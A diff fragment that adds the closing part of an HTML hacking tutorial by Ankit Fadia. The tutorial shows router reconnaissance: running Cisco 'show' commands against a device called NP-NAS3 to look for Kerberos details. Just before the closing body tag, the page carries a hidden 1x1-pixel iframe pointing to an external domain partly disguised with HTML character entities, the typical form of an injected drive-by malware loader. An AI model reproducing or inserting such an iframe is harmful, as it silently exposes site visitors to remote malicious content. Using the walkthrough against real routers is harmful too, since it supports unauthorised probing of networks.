+style="mso-spacerun: yes">           </span>Display information about terminal
+lines</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>version<span
+style="mso-spacerun: yes">         </span>System hardware and software status</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>voice<span
+style="mso-spacerun: yes">           </span>Voice port configuration &amp;
+stats</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">  </span>vpdn<span
+style="mso-spacerun: yes">            </span>VPDN information</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>[Ankit: Bingo! It does have a Kerberos option. This means
+that they are running Kerberos, but let me try if I can get more info about
+Kerberos.]</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>NP-NAS3&gt;show kerberos </p>
+
+<p class=MsoNormal>% Incomplete command.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>[Ankit: This means that the command that we typed was not
+complete or in other words, requires more parameters. So to get a complete list
+of Kerberos parameters, type the following command:]</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes"> </span></p>
+
+<p class=MsoNormal>NP-NAS3&gt;show kerberos ?</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>creds<span style="mso-spacerun: yes">  </span>Show Kerberos
+Credentials</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>NP-NAS3&gt;show kerberos creds</p>
+
+<p class=MsoNormal>No Kerberos credentials.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>[Ankit: We are unlucky, as although Kerberos is installed
+and running, the Router is configured to not give out information about it to the
+outside un-trusted connections.]</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Well, that is all for this manual, till the next update,
+goodbye.</p>
+
+<p class=MsoNormal>Ankit Fadia</p>
+
+<p class=MsoNormal><a href="mailto:ankit@bol.net.in">ankit@bol.net.in</a></p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>To receive more tutorials on Everything you dreamt of
+written by Ankit Fadia, join his mailing list, by sending an email to: <a
+href="mailto:programingforhackers-subscribe@egroups.com">programingforhackers-subscribe@egroups.com</a></p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+</div>
+
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+
+</html>
